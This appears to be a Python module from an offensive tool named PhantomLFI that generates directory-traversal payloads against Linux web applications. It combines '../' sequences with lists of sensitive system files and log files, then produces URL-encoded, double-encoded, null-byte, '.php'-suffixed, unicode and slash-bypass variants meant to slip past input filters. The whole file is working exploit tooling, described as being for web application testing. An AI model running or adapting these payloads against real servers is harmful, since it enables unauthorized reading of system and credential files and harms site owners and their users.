"""
Directory traversal payload generator for PhantomLFI.
Linux-focused for web application testing.
Done by D4rk0ps
"""

from core.encoders import (
    url_encode,
    double_url_encode,
    null_byte_suffix,
    null_byte_with_extension,
    unicode_encode,
    apply_slash_bypasses,
)
from config.default_targets import (
    LINUX_SENSITIVE_FILES,
    LINUX_LOG_FILES,
)


def build_traversal(depth: int) -> str:
    """Build a standard directory traversal string."""
    return "../" * depth


def generate_traversal_payloads(depth: int) -> dict:
    """Generate directory traversal payloads for Linux target files."""
    results = {}

    target_files = []
    target_files.extend([("Linux", f) for f in LINUX_SENSITIVE_FILES])
    target_files.extend([("Linux Logs", f) for f in LINUX_LOG_FILES])

    for category, target_file in target_files:
        key = f"Directory Traversal — {category}"
        if key not in results:
            results[key] = []

        clean_target = target_file.lstrip("/")

        for d in range(1, depth + 1):
            base_traversal = build_traversal(d)

            standard = f"{base_traversal}{clean_target}"
            results[key].append(standard)
            results[key].append(url_encode(standard))
            results[key].append(double_url_encode(standard))
            results[key].append(null_byte_suffix(standard))
            results[key].append(null_byte_with_extension(standard, ".php"))
            results[key].append(unicode_encode(standard))

            if d == depth:
                for variant in apply_slash_bypasses(base_traversal):
                    if variant != base_traversal:
                        results[key].append(f"{variant}{clean_target}")

        results[key] = list(dict.fromkeys(results[key]))

    return results
